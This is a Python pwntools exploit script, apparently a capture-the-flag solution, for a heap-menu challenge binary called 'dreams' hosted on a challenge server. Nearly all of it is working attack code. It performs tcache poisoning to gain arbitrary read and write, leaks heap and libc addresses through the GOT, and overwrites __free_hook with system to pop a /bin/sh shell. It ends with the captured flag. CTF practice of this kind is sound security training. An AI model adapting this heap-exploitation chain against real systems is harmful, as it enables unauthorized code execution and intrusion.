#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template dreams
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('dreams')
libc = ELF('./libc.so') if args.REMOTE else ELF('./libc.so.6')

HOST, PORT = "challs.actf.co 31227".split()

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)

def menu_choice(choice: int) -> None:
    io.sendlineafter(b"> ", str(choice).encode())

def sleep(idx: int, date: bytes, dream: bytes) -> None:
    menu_choice(1)
    io.sendlineafter(b"dream? ", str(idx).encode())
    io.sendlineafter(b"))? ", date)
    io.sendlineafter(b"about? ", dream)

def sell(idx: int) -> None:
    menu_choice(2)
    io.sendlineafter(b"in? ", str(idx).encode())

def psychiatrist(idx: int, date: bytes) -> bytes:
    menu_choice(3)
    io.sendlineafter(b"trouble? ", str(idx).encode())
    io.recvuntil(b"that ")
    dream = io.recvline().strip()
    io.sendlineafter(b"date: ", date)

    return dream

def leak_idx(idx: int, date: bytes = b"\x0a") -> int:
    menu_choice(3)
    io.sendlineafter(b"trouble? ", str(idx).encode())
    io.recvuntil(b"that ")
    dream = io.recvline().strip()
    io.sendlineafter(b"date:", date)

    return u64(dream.ljust(8, b"\x00"))

io = start()

# prepare arbitrary write/read on tcache
# attack: https://github.com/shellphish/how2heap/blob/master/glibc_2.31/tcache_poisoning.c
sleep(0, b"01", b"AAAA")
sleep(1, b"02", b"BBBB")
sell(0)
sell(1)
heap_leak = leak_idx(0)
assert heap_leak > 0x100
log.info(f"got leak: {hex(heap_leak)}")
heap_offset = 0x280 + 0x10
fake_chunk = heap_leak + heap_offset
# onvewrite fd pointer to the dreams chunk
psychiatrist(1, p64(fake_chunk))

sleep(2, b"03", b"CCCC")
# in this malloc I have arbitrary write to the fake chunk address
# overwrite second chunk address with puts@got
sleep(3, b"0", p64(exe.got.puts-0x8))
# leak libc address
libc_leak = leak_idx(1)
libc.address = libc_leak - libc.sym.puts
log.success(f"libc @ {hex(libc.address)}")
# overwrite first chunk address with __free_hook
psychiatrist(3, p64(libc.sym["__free_hook"]))
# write system to __free_hook
psychiatrist(0, p64(libc.sym.system))
# prepare chunk to execute system("/bin/sh")
psychiatrist(3, b"/bin/sh\x00")
# shell
sell(3)

io.interactive()

# actf{hav3_you_4ny_dreams_y0u'd_like_to_s3ll?_cb72f5211336}

